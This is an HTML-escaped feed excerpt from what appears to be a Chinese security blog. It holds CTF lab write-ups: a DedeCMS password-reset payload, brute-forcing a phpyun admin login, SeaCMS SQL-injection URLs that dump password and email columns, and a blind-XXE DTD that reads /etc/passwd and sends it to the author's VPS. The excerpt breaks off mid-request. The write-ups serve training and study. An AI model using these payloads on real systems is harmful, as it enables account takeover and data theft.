&lt;p&gt;我们需要利用漏洞来重置前台admin用户的密码。&lt;/p&gt;
&lt;p&gt;访问靶场地址：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://靶场ip:端口/member/resetpassword.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;构造payload如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dopost=safequestion&amp;amp;safequestion=0.0&amp;amp;safeanswer=&amp;amp;id=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们使用&lt;code&gt;hackbar&lt;/code&gt;发送&lt;code&gt;payload&lt;/code&gt;，并使用&lt;code&gt;burp&lt;/code&gt;去抓取这个&lt;code&gt;post&lt;/code&gt;数据包。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708035218.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708035309.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后放掉这个&lt;code&gt;post&lt;/code&gt;包，抓到修改密码的数据包。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708035432.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后在浏览器中访问这个地址，即可修改前台&lt;code&gt;admin&lt;/code&gt;账户密码。&lt;/p&gt;
&lt;h2 id=&#34;4-修改admin后台密码&#34;&gt;4. 修改admin后台密码&lt;/h2&gt;
&lt;p&gt;我们发现在&lt;code&gt;dedecms&lt;/code&gt;中，如果账户是&lt;code&gt;admin&lt;/code&gt;，修改前台密码以后，后台账户密码也会同步改变。&lt;/p&gt;
&lt;h1 id=&#34;2-phpyun&#34;&gt;2. phpyun&lt;/h1&gt;
&lt;p&gt;首先进入首页，发现是一个&lt;code&gt;phpyun&lt;/code&gt;的&lt;code&gt;cms&lt;/code&gt;建站系统建立的网站。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708011114.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以操作的空间非常多，因为有非常多的框框，由于题目要求是找出admin的密码，瞬间想到了几个思路&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;强制爆破admin账户密码&lt;/li&gt;
&lt;li&gt;取得权限，找出admin的账户密码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;那么我们先用御剑跑一波，看看后台地址在哪里&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708003909.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;如愿以偿，发现了后台地址，我们进入后台地址看一下，发现是有验证码的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708011606.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;手工尝试弱密码后，发现每次验证码都需要变化，我们试试&lt;code&gt;burp&lt;/code&gt;抓包。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708012329.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;抓到了，然后发送至&lt;code&gt;repeater&lt;/code&gt;，手动测试看一看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708012751.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们发现这个验证码在&lt;code&gt;burp&lt;/code&gt;里面是可以重复使用的，密码一直错误，但是一直可以使用。那我们可以换一个省力一点的方法，使用字典爆破。&lt;/p&gt;
&lt;p&gt;我们重新抓包，发送到&lt;code&gt;intruder&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708013702.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;清除多余的有效负载后，给密码处添加有效负载。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708013940.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;由于字典的好坏直接影响爆破的效率，在这里我们尝试了多个字典。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708014147.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;终于成功爆破，发现密码&lt;code&gt;Password&lt;/code&gt;，也就是&lt;code&gt;flag{Password}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708015214.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{Password}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;3-seacms&#34;&gt;3. seacms&lt;/h1&gt;
&lt;p&gt;首先进入靶场首页，发现是一个海洋CMS建站系统建立的网站。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708021140.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;先上扫描器看看吧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708021518.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;虽然发现很多文件，但是针对题目要求，没有发现什么特别的地方，无非是登录注册入口。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708021321.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么我们先注册一个账户试试看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708021754.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功注册&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708022030.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入系统后，没有发现特别多的东西，发现了密码其实可以直接在控制台看到&lt;code&gt;md5&lt;/code&gt;加密后的密码，是完全可以被&lt;code&gt;XSS&lt;/code&gt;等利用的。&lt;/p&gt;
&lt;p&gt;另外发现&lt;code&gt;test02@test.com&lt;/code&gt;的位置是很有可能存放&lt;code&gt;flag&lt;/code&gt;的地方。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708022348.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么我们退出去注册&lt;code&gt;flag&lt;/code&gt;账户试试看，发现用户已经存在。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708022840.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;那我们登录自己的账户，然后找回密码，抓包的过程中把用户改成&lt;code&gt;flag&lt;/code&gt;能不能借此更改&lt;code&gt;flag&lt;/code&gt;账户的密码呢？&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707235005.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;结果发现，系统应该没有配置邮件服务器，无法发送邮件。我们看不到更改密码所需要的链接。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708023120.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;借此我们完全可以推测，这是一个利用找回密码机制更改密码的逻辑漏洞，我的推测是，在找回密码的邮件里有修改密码的链接，用户可能是&lt;code&gt;flag&lt;/code&gt;，修改链接中的参数可以越过原本的账户把&lt;code&gt;flag&lt;/code&gt;账户密码改掉，进入&lt;code&gt;flag&lt;/code&gt;账户，然后找到存放邮箱的地方，找到&lt;code&gt;flag&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;那么是不是这样就没办法了找到&lt;code&gt;flag&lt;/code&gt;了呢，其实不然。这种&lt;code&gt;CMS&lt;/code&gt;漏洞百出，我们完全可以使用其他的&lt;code&gt;payload&lt;/code&gt;进行攻击。&lt;/p&gt;
&lt;p&gt;经过查询，发现&lt;code&gt;seacms&lt;/code&gt;在老版本中一直存在SQL注入漏洞，我们使用现成的&lt;code&gt;payload&lt;/code&gt;注入看看。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;comment&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;api&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;index&lt;/span&gt;.php&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;page&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;rlist[]&lt;span style=&#34;color:#f92672&#34;&gt;=@`%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;extractvalue&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;concat_ws&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;x20,&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;x5c,(&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;(password)&lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;sea_admin))),&lt;span style=&#34;color:#f92672&#34;&gt;@`%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;好像可以&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708023844.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么我们不断更改&lt;code&gt;payload&lt;/code&gt;，找找看，发现最大的问题是不知道表名列名，所以总是错误。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;comment&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;api&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;index&lt;/span&gt;.php&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;page&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;rlist[]&lt;span style=&#34;color:#f92672&#34;&gt;=@`%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;extractvalue&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;concat_ws&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;x20,&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;x5c,(&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;(password)&lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;sea_test01))),&lt;span style=&#34;color:#f92672&#34;&gt;@`%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708024619.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;大家在一起讨论的时候，岚哥爆出来了表名和列名，发现有很多奇怪的列名，都是&lt;code&gt;sea_&lt;/code&gt;开头，因此后续尝试根据不同的列名进行元素的查找，列名非常多。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708024917.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们回想起来，&lt;code&gt;flag&lt;/code&gt;是存放在邮箱的位置的，那么我们构造一下&lt;code&gt;payload&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;comment&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;api&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;index&lt;/span&gt;.php&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;page&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;rlist[]&lt;span style=&#34;color:#f92672&#34;&gt;=@`%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;extractvalue&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;concat_ws&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;x20,&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;x5c,(&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;(email)&lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;sea_member&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;limit&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;201&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;))),&lt;span style=&#34;color:#f92672&#34;&gt;@`%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707232351.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{easyeasyeasy}&lt;/p&gt;
&lt;/blockquote&gt;
- https://b40du.github.io/posts/writeup-chaitin-business_logic-01/ - This is a customized copyright.</description>
        </item>
    
    
    
        <item>
        <title>Writeup 之 XXE-Labs 魔改flag版</title>
        <link>https://b40du.github.io/posts/writeup-chaitin-xxe_labs-01/</link>
        <pubDate>Mon, 06 Jul 2020 23:56:33 +0800</pubDate>
        
        <guid>https://b40du.github.io/posts/writeup-chaitin-xxe_labs-01/</guid>
        <description>爆肚的杂货铺 https://b40du.github.io/posts/writeup-chaitin-xxe_labs-01/ -&lt;h1 id=&#34;1-xxe实验室&#34;&gt;1. xxe实验室&lt;/h1&gt;
&lt;p&gt;前三个比较简单，直接进入第四个&lt;/p&gt;
&lt;p&gt;首先我们要明确&lt;code&gt;Blind XXE&lt;/code&gt;的用途，对于传统的&lt;code&gt;XXE&lt;/code&gt;来说，必须要求服务器有回显或者报错，才能使用&lt;code&gt;XXE&lt;/code&gt;读取服务器端的文件。如果服务器没有回显，只能使用&lt;code&gt;Blind XXE&lt;/code&gt;漏洞来构建一条带外信道提取数据。&lt;/p&gt;
&lt;p&gt;那么从源代码来看，前几个和第四个有何不同呢&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;DOMDocument.php&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707023900.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;SimpleXMLElement.php&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707024003.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;simplexml_load_string.php&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707024044.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;BlindXXE.php&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707024120.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们发现&lt;code&gt;BlindXXE.php&lt;/code&gt;的源代码，直接去掉了回显，没有打印变量，保存到缓冲区的步骤。&lt;/p&gt;
&lt;p&gt;找到了根本区别，直接寻找&lt;code&gt;flag&lt;/code&gt;吧。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;简单的方法，直接在有回显的地方使用&lt;code&gt;php&lt;/code&gt;的&lt;code&gt;filter&lt;/code&gt;协议读取文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707024848.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;然后&lt;code&gt;base64&lt;/code&gt;解密，得到&lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707025042.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{xxe_easy}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;2-短信&#34;&gt;2. 短信&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;进入靶场首页，发现一个类似cms的商务站页面&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707005349.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;四处点点看看，发现一个论坛&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707005458.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;看看能不能注册，发现管理员禁止了注册&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707005607.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;尝试登录，发现每次都需要滑块认证&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707005923.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;那么还是上大杀器，目录扫描吧，御剑跑起来&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707010155.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;而在这其中呢，&lt;code&gt;/readme.txt&lt;/code&gt;文件中有很明显的线索，告诉我们这是一个S-CMS建站系统&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707020436.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;然后我们对其进行搜索，看看有没有可以利用的漏洞，发现大都是CNVD录入的SQL注入漏洞，同时看到很多文章都是对这种CMS进行源代码审计查找漏洞的，我们不妨把源程序下载下来，由于是老版本的靶场，特地找了一个老版本的进行下载&lt;/li&gt;
&lt;li&gt;然后我们手动的搜索容易产生&lt;code&gt;XXE&lt;/code&gt;漏洞的标志性函数&lt;code&gt;simplexml_load_string()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;PHP 中的以 &lt;code&gt;simplexml_load&lt;/code&gt; 开头的函数默认会解析外部实体，有 XXE 漏洞的标志性函数为 &lt;code&gt;simplexml_load_string()&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;经过反复实验，找到一个非常可疑的页面，该页面是&lt;code&gt;api&lt;/code&gt;目录下的&lt;code&gt;notify.php&lt;/code&gt;页面，这里的&lt;code&gt;$GLOBALS[&#39;HTTP_RAW_POST_DATA&#39;]&lt;/code&gt;函数，和&lt;code&gt;php://input&lt;/code&gt;的传参方式是一样的，但后面没有对&lt;code&gt;libxml&lt;/code&gt;进行过滤，直接就传入了&lt;code&gt;simplexml_load_string()&lt;/code&gt;函数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707020415.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;然后我们看看最新版的&lt;code&gt;CMS&lt;/code&gt;改成了什么样子，发现多了一个&lt;code&gt;libxml_disable_entity_loader(true)&lt;/code&gt;进行保护&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707012740.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;网页访问该页面，不会爆出页面不存在的错误，我们使用&lt;code&gt;burp&lt;/code&gt;抓包，并发送&lt;code&gt;xml&lt;/code&gt;类型的&lt;code&gt;post&lt;/code&gt;请求看看&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在服务器端构造&lt;code&gt;.dtd&lt;/code&gt;文件&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;lt;?xml version&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt; encoding&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;?&amp;gt;
&amp;lt;!ENTITY % file SYSTEM &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;php://filter/convert.base64-encode/resource=file:///etc/passwd&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;!ENTITY % all &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;!ENTITY send SYSTEM &amp;#39;http://本人vps的ip:7890/?%file;&amp;#39;&amp;gt;&amp;#34;&lt;/span&gt;&amp;gt;%all;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707014811.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;然后使用&lt;code&gt;python3&lt;/code&gt;快速地构造一个&lt;code&gt;http&lt;/code&gt;服务&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015008.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;然后构造&lt;code&gt;post&lt;/code&gt;请求包，并发送&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE root [
